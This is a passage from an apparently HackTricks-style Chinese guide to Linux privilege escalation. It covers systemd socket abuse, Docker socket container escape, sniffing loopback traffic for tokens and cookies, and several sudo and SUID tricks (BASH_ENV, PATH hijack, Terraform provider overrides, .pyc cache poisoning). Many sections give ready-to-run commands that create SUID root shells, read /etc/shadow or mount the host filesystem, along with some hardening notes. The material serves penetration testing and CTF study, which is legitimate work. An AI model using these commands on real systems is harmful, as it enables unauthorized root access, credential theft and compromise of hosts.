- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项各不相同，但总的来说用于**指定 socket 的监听位置**（AF_UNIX socket 文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`：接受布尔值参数。如果为 **true**，则**为每个传入连接启动一个 service 实例**，并且只将连接 socket 传递给该实例。如果为 **false**，则将所有监听 socket **传递给已启动的 service unit**，并为所有连接只启动一个 service unit。对于数据报 sockets 和 FIFOs，此值会被忽略，因为无论如何都由单个 service unit 处理所有传入流量。**默认为 false**。出于性能考虑，建议仅以适用于 `Accept=no` 的方式编写新的 daemons。
- `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，分别在监听 **sockets**/FIFOs **创建**并绑定之前或之后**执行**。命令行的第一个 token 必须是绝对文件名，后面再跟进程的参数。
- `ExecStopPre`、`ExecStopPost`：分别在监听 **sockets**/FIFOs **关闭**并移除之前或之后**执行**的其他**命令**。
- `Service`：指定在有**传入流量**时**激活**的 **service** unit 名称。此设置仅适用于 Accept=no 的 sockets。默认值是与 socket 同名的 service（后缀会被替换）。在大多数情况下，无需使用此选项。

### 可写的 .socket 文件

如果发现一个**可写**的 `.socket` 文件，可以在 `[Socket]` 部分的开头**添加**类似这样的内容：`ExecStartPre=/home/kali/sys/backdoor`，这样 backdoor 就会在 socket 创建前执行。因此，**你可能需要等到机器重启后才能生效。**\
_请注意，系统必须正在使用该 socket 文件配置，否则 backdoor 不会执行_

### Socket activation + 可写的 unit 路径（创建缺失的 service）

另一个影响很大的错误配置是：

- 一个 `Accept=no` 且设置了 `Service=<name>.service` 的 socket unit
- 被引用的 service unit 不存在
- 攻击者可以写入 `/etc/systemd/system`（或其他 unit 搜索路径）

在这种情况下，攻击者可以创建 `<name>.service`，然后向该 socket 发送流量，触发 systemd 以 root 身份加载并执行新 service。

操作流程：

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 可写 socket

如果你**发现任何可写 socket**（_这里说的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你就可以与该 socket 通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets

```bash
netstat -a -p --unix
```

### 原始连接

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**利用示例：**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能有一些**监听 HTTP** 请求的套接字（_我说的不是 .socket 文件，而是充当 unix 套接字的文件_）。你可以使用以下命令检查：

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

如果 socket **响应 HTTP** 请求，那么你就可以与其**通信**，并可能**利用某些漏洞**。

### 可写的 Docker Socket

Docker socket 通常位于 `/var/run/docker.sock`，是一个必须妥善保护的关键文件。默认情况下，`root` 用户和 `docker` 组的成员都可以写入该文件。拥有此 socket 的写入权限可能导致权限提升。以下是实现方法的说明，以及在无法使用 Docker CLI 时的替代方法。

#### **使用 Docker CLI 提升权限**

如果你拥有 Docker socket 的写入权限，可以使用以下命令提升权限：<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

这些命令允许你运行一个可访问主机文件系统 root 权限的容器。

#### **直接使用 Docker API**

如果无法使用 Docker CLI，仍可通过 Unix socket 上的原始 HTTP 请求滥用 Docker socket。最可靠的流程是：

- 创建一个长期运行的辅助容器，并将主机 root 目录 bind mount 到容器中
- 启动它
- 在该辅助容器中创建一个 `exec` 实例
- 启动该 `exec` 实例，并通过 API 读取输出

**列出 Docker 镜像**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**创建并启动一个辅助容器**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**创建一个 exec 实例**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**启动 exec 实例并读取输出**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

这种模式通常比尝试使用 `socat` 或 `nc -U` 手动驱动 `attach` 更可靠。一旦你能够通过 `/:/host` 创建 helper，就可以使用其他 `exec` 实例读取 `/host/root/...` 等文件、在 `/host/root/.ssh` 下添加 SSH keys，或修改主机启动文件。

### 其他

请注意，如果你因为**属于 `docker` 组**而拥有对 docker socket 的写入权限，那么你还有[**更多提权方式**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API 正在某个端口上监听**，你也可能可以攻陷它](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看[容器逃逸或滥用容器运行时以提权的更多方式](：

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现自己可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能可以滥用它来提权**：

{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现自己可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能可以滥用它来提权**：

{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一种复杂的**进程间通信（IPC）系统**，可让应用程序高效地交互并共享数据。它针对现代 Linux 系统设计，为不同形式的应用程序通信提供了强大的框架。<sup>[[16]](#references)</sup>

该系统用途广泛，支持基础 IPC，可增强进程间的数据交换，类似于**增强型 UNIX domain sockets**。此外，它还有助于广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth daemon 发出的来电信号可以让 music player 静音，从而提升用户体验。此外，D-Bus 还支持远程对象系统，可简化应用程序间的服务请求和方法调用，让原本复杂的流程更加顺畅。

D-Bus 采用**允许/拒绝模型**，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略规定了与 bus 的交互方式，攻击者可能通过利用这些权限实现提权。

以下是 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中的策略示例，其中详细说明了 root 用户拥有 `fi.w1.wpa_supplicant1`、向其发送消息以及接收其消息的权限。

未指定用户或组的策略适用于所有用户和组，而“default”上下文策略则适用于所有未被其他特定策略涵盖的对象。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**了解如何在此处枚举并利用 D-Bus 通信：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并弄清机器所处的位置总是很有意思的。

### 通用枚举

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

如果某个有效的 `/etc/inetd.conf` 条目以 root 身份运行 GNU Inetutils `telnetd`，请检查配置的二进制文件版本，以及本地监听器，即使端口仅绑定到 loopback 也是如此。GNU Inetutils 1.9.3 至 2.7 存在一个 [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89)，客户端提供的 `USER` 会传递给 `login -f`（CVE-2026-24061）。进程或版本字符串只是一个迹象；在认定其存在暴露风险前，请确认供应商的补丁状态和实际运行的守护进程。[Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) 中有更多详情。

### 出站过滤快速初步排查

如果主机可以运行命令，但 callbacks 失败，请快速区分 DNS、传输、代理和路由过滤：

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 开放端口

在访问机器之前，务必检查你此前无法与之交互的网络服务：

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

按绑定目标对监听器分类：

- `0.0.0.0` / `[::]`：对所有本地接口开放。
- `127.0.0.1` / `::1`：仅本地可访问（适合作为隧道/转发候选）。
- 特定内网 IP（例如 `10.x`、`172.16/12`、`192.168.x`、`fe80::`）：通常只能从内网网段访问。

### 仅本地服务排查流程

攻陷主机后，绑定到 `127.0.0.1` 的服务通常会首次从你的 shell 中变得可访问。一个快速的本地排查流程是：

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS 作为网络扫描器（仅网络模式）

除了本地 PE 检查外，linPEAS 还可以作为专用网络扫描器运行。它会使用 `$PATH` 中可用的二进制文件（通常是 `fping`、`ping`、`nc`、`ncat`），不会安装工具。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

如果你使用 `-d`、`-p` 或 `-i`，但未使用 `-t`，linPEAS 会作为纯网络扫描器运行（跳过其余提权检查）。

### Sniffing

检查是否可以嗅探流量。如果可以，你可能就能获取一些凭据。

```
timeout 1 tcpdump
```

快速实用检查：

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) 在 post-exploitation 阶段尤其有价值，因为许多仅供内部使用的服务会在此暴露 tokens/cookies/credentials：

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

现在捕获，稍后解析：

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## 用户

### 通用枚举

检查你是**谁**、拥有哪些**权限**、系统中有哪些**用户**、哪些用户可以**登录**，以及哪些用户拥有 **root 权限**：

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### 大 UID

某些 Linux 版本存在一个 bug，允许 **UID > INT_MAX** 的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和[这里](https://twitter.com/paragonsec/status/1071152249529884674)。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**使用以下命令利用它：** **`systemd-run -t /bin/bash`**

### 组

检查你是否属于**某个可能授予你 root 权限的组**：


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有有用内容（如果可以）

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### 密码策略

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 已知密码

如果你**知道环境中的任何密码**，请尝试使用该密码登录每个用户。

### Su Brute

如果你不介意制造大量噪声，并且计算机上存在 `su` 和 `timeout` 二进制文件，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 对用户进行暴力破解。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数时也会尝试对用户进行暴力破解。

## 可写 PATH 滥用

### $PATH

如果你发现自己**可以写入 $PATH 中的某个文件夹**，就可以尝试在该可写文件夹中**创建一个后门**，并将其命名为另一个用户（最好是 root）将要执行的某个命令，且该命令**不会从 $PATH 中位于你的可写文件夹之前的文件夹加载**。

### SUDO 和 SUID

你可能被允许使用 sudo 执行某些命令，或者这些命令可能具有 suid 位。使用以下命令检查：

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一些**意料之外的命令允许你读取和/或写入文件，甚至执行命令**。<sup>[[8]](#references)</sup> 例如：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以其他用户的权限执行某些命令。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

在此示例中，用户 demo 可以以 root 身份运行 vim。现在只需将 ssh 密钥添加到 root 目录，或调用 sh，即可轻松获得 shell。

```
sudo vim -c '!sh'
```

### sudo 脚本中的未加引号 Bash 比较

在 Bash 中，`[[ "$protected" == $candidate ]]` 的右侧是一个 pattern。如果一个可通过 sudo 以 root 权限运行的脚本从调用者可控的文件中填充 `candidate`，那么像 `prefix*` 这样的值就可能匹配受保护字符串的开头。不同的成功和错误路径随后可能泄露前缀 oracle。如果需要进行字面值相等比较，请给右侧加引号（`[[ "$protected" == "$candidate" ]]`）。在认定未加引号的比较可被利用之前，应检查实际的 sudo 参数、输入来源以及可观察到的分支行为。[GNU Bash 手册](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)定义了这种 pattern 行为。

### 通过 sudo 处理 PrusaSlicer 项目文件

如果调用者可以选择要切片的 `.3mf` 项目文件，那么对 `prusaslicer` 或 `prusa-slicer` 的不受限制、可通过 sudo 以 root 权限运行的授权就值得审查。项目可以包含一个在导出 G-code 时运行的后处理脚本；通过 2.6.1 版本，精心构造的项目可能会在 PrusaSlicer 中执行命令（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。在断定该权限边界可被触及时，请确认实际生效的 sudo 规则、二进制文件版本和供应商补丁、项目来源，以及相关导出路径是否会运行。固定的项目参数或生效的 `NOEXEC` 策略都可能改变结果。仅仅发现系统安装了切片器，并不能证明存在权限提升路径。

### SETENV

此指令允许用户在执行某个程序时**设置环境变量**：

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

此示例**基于 HTB 机器 Admirer**，存在 **PYTHONPATH hijacking** 漏洞，可在以 root 身份执行脚本时加载任意 Python 库：

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo 允许的 Python 导入中的可写 `__pycache__` / `.pyc` 投毒

如果 **sudo 允许运行的 Python 脚本**导入了一个包目录中包含**可写 `__pycache__`** 的模块，你可能可以替换缓存的 `.pyc`，并在下次导入时以特权用户身份执行代码。<sup>[[30]](#references)</sup>

- 原理：
  - CPython 将字节码缓存存储在 `__pycache__/module.cpython-<ver>.pyc` 中。<sup>[[31]](#references)</sup>
  - 解释器会验证 **header**（magic 值 + 与源文件关联的时间戳/哈希元数据），然后执行该 header 后存储的 marshaled 代码对象。
  - 如果目录可写，你可以**删除并重新创建**缓存文件，因此即使 `.pyc` 属于 root 且不可写，也仍然可以替换它。
- 典型路径：
  - `sudo -l` 显示有一个你可以以 root 身份运行的 Python 脚本或 wrapper。
  - 该脚本从 `/opt/app/`、`/usr/local/lib/...` 等路径导入本地模块。
  - 你或所有用户都可以写入该模块的 `__pycache__` 目录。

快速枚举：

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

如果你可以检查特权脚本，请找出导入的模块及其缓存路径：<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

滥用流程：

1. 运行一次允许通过 sudo 执行的脚本，让 Python 创建合法的缓存文件（如果该文件尚不存在）。
2. 从合法的 `.pyc` 中读取前 16 个字节，并在被投毒的文件中复用它们。
3. 编译一个 payload 代码对象，用 `marshal.dumps(...)` 将其序列化，删除原始缓存文件，然后用原始文件头和恶意字节码重新创建该文件。
4. 再次运行允许通过 sudo 执行的脚本，让导入操作以 root 身份执行你的 payload。

重要说明：

- 复用原始文件头是关键，因为 Python 会将缓存元数据与源文件进行核对，而不会检查字节码主体是否真的与源文件匹配。
- 如果源文件归 root 所有且不可写，但其所在的 `__pycache__` 目录可写，这种方法尤其有用。
- `PYTHONDONTWRITEBYTECODE=1` 和 `python -B` 会阻止 Python 写入新的 `.pyc` 文件；但**不会**阻止它加载已有的、有效的、被攻击者替换过的缓存。关键在于低权限用户能否替换特权导入操作会接受的缓存。Python 会在加载缓存的字节码前检查时间戳/大小或哈希元数据。请参阅 [Python 导入参考](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) 和[命令行文档](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE)。

最小概念验证示例：

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

加固：

- 确保特权 Python import path 中没有任何目录可被低权限用户写入，包括 `__pycache__`。
- 审查缓存目录的所有权和权限，包括现有的 `.pyc` 文件。禁用字节码写入可以减少新缓存的生成，但无法防止可被替换的现有缓存带来的风险。
- 对待可写的本地 Python 模块和可写的缓存目录，应与对待由 root 执行的可写 shell 脚本或共享库一样。

### 通过 sudo env_keep 保留 BASH_ENV → root shell

如果 sudoers 保留了 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），那么在调用获准执行的命令时，你可以利用 Bash 的非交互式启动行为，以 root 身份运行任意代码。<sup>[[24]](#references)</sup>

- 原理：对于非交互式 shell，Bash 会先解析 `$BASH_ENV` 并 source 该文件，然后再运行目标脚本。许多 sudo 规则允许运行脚本或 shell wrapper。如果 sudo 保留了 `BASH_ENV`，你的文件就会以 root 权限被 source。<sup>[[23]](#references)</sup>

- 要求：
  - 有一条你可以运行的 sudo 规则（任何会以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
  - `BASH_ENV` 已包含在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- 加固：
  - 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
  - 避免为 sudo 允许执行的命令使用 shell wrappers；改用精简的二进制文件。
  - 考虑启用 sudo I/O logging，并在使用保留的环境变量时触发告警。

### 通过 sudo 使用保留的 HOME 运行 Terraform（!env_reset）

当 sudo 允许以权限更高的用户身份运行 Terraform 时，`!env_reset` 提示你应检查该特定规则实际会保留哪些环境变量。确认生效的 `HOME` 或 `TF_CLI_CONFIG_FILE` 后，再判断调用者可写的 `.terraformrc` 或 `terraform.rc` 是否是当前使用的 CLI 配置。只有当固定的 Terraform 命令会加载 `provider_installation.dev_overrides` 条目所指定的 provider，并且调用者能将其可执行文件放入选定目录时，该条目才会产生影响。<sup>[[25]](#references)</sup>

- 将所需的 provider 指向一个可写目录，并放入一个以该 provider 命名的恶意插件（例如：`terraform-provider-examples`）：

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform 会在 Go plugin 握手时失败，但在退出前会以 root 身份执行 payload，留下一个 SUID shell。

### TF_VAR overrides + symlink validation bypass

如果特定的 sudo 规则保留了相关环境变量，就可以通过 `TF_VAR_<name>` 环境变量提供 Terraform 变量。要读取源符号链接，还需要一个会跟随链接并将受保护结果复制到调用者可读取位置的 provider。要写入目标符号链接，则需要一个由调用者控制的目标条目，以及一个会在写入时跟随该链接的特权 provider；后续定时任务只是可能产生的后果之一。在测试任一路径之前，请使用 `sudo -l`、`stat` 和 `readlink` 等只读命令，检查具体的 sudo 授权、相关 `.tf` 文件、选用的 CLI 配置以及路径所有权。诸如 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱词法验证不会解析符号链接：<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform 会解析符号链接，并将真实的 `/root/root.txt` 复制到攻击者可读取的目标位置。同样的方法也可用于向特权路径**写入**内容：预先创建目标符号链接（例如，将其指向 `/etc/cron.d/` 内的路径）。

### requiretty / !requiretty

在某些较旧的发行版中，sudo 可以通过 `requiretty` 配置为只能从交互式 TTY 运行。如果设置了 `!requiretty`（或未设置该选项），则可在反向 shell、cron 作业或脚本等非交互式环境中执行 sudo。

```bash
Defaults !requiretty
```

这本身并不是直接漏洞，但它会扩大 sudo 规则在无需完整 PTY 的情况下被滥用的情形。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH`，或者 `secure_path` 中包含攻击者可写的条目（例如 `/home/<user>/bin`），那么 sudo 允许执行的目标中未限定路径的外部命令可能会被同名命令替代。<sup>[[3]](#references)</sup> 如果没有生效的 `secure_path`，也值得检查，**前提是**该命令的 sudo 环境保留了由调用者控制的 `PATH`；仅仅缺少 `secure_path` 并不能证明这一点。先在不运行脚本的情况下读取它，然后核实确切的 RunAs 和参数规则、实际生效的命令搜索路径，以及是否有更靠前且可写、可遍历并包含该命令名称的目录。身份验证、`NOEXEC`、shell 内置命令和绝对命令路径都可能改变结果。

- 要求：一条 sudo 规则（通常是 `NOPASSWD`），用于运行会调用未使用绝对路径的命令（`free`、`df`、`ps` 等）的脚本或二进制文件，并且存在一个优先搜索的可写 PATH 条目。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### 绕过 Sudo 执行路径限制
**跳转**以读取其他文件或使用**符号链接**。例如，在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

如果使用了**通配符**（\*），就更容易了：

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**防御措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 未指定命令路径的 Sudo 命令/SUID binary

如果**sudo 权限**授予了单个**未指定路径的命令**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

如果 **suid** 二进制文件**在执行另一个命令时没有指定其路径（务必使用** _**strings**_ **检查可疑 SUID 二进制文件的内容）**，也可以使用此技术。

[要执行的 Payload 示例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### 指定命令路径的 SUID 二进制文件

如果 **suid** 二进制文件**在执行另一个命令时指定了路径**，那么你可以尝试创建一个以该命令命名的**函数**并将其导出。

例如，如果一个 suid 二进制文件调用 _**/usr/sbin/service apache2 start**_，你就应该尝试创建并导出该函数：

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

然后，当你调用这个 SUID binary 时，该函数就会执行

### 自定义 SUID copy wrapper

一个由 root 拥有、接受源路径和目标路径的 SUID utility，可能跨越两个不同的信任边界。如果它根据任一参数构造 shell 命令（例如将拼接好的 `cp` 命令传给 `system()`），shell metacharacters 可能会以该进程的有效权限执行其他命令。即使它不经过 shell 安全地调用 `cp`，不受限制的目标路径仍可能允许攻击者以特权任意写入文件，例如 `/etc/passwd`。检查 wrapper 的参数处理方式、有效 UID 行为、目标路径限制，以及复制后的文件内容是否仍由调用者控制；通用的 `cp` 错误信息或 SUID bit 本身，都不能证明上述任一路径可行。在进行任何手动测试前，先以被动方式枚举该 binary 及其权限。

### 由 SUID wrapper 执行的可写脚本

一种常见的 custom app 配置错误是：由 root 拥有的 SUID binary wrapper 会执行一个脚本，而低权限用户可以写入该脚本。

典型模式：

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

快速检查：

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

此攻击路径在 `/usr/local/bin` 中提供的“maintenance”/“backup”包装程序中尤其常见。

